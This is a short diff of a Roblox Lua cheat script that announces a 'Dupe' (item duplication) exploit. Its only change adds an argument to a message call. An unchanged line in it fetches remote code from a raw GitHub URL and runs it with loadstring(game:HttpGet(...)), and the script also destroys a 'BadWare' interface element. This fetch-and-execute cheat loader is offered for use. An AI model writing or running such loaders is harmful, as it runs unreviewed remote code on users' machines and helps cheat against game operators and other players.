@@ -1,6 +1,6 @@
 if game.CoreGui:FindFirstChild("BadWare") then game.CoreGui.BadWare:Destroy() end
 wait(0.5)
-game.Players.LocalPlayer.PlayerGui.MainGui.SendMessage:Fire("Started Dupe!")
+game.Players.LocalPlayer.PlayerGui.MainGui.SendMessage:Fire("Started Dupe!", true)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/sTempestHUB/scripts/main/gay'))()
 wait(0.1)
 if game.CoreGui:FindFirstChild("BadWare") then
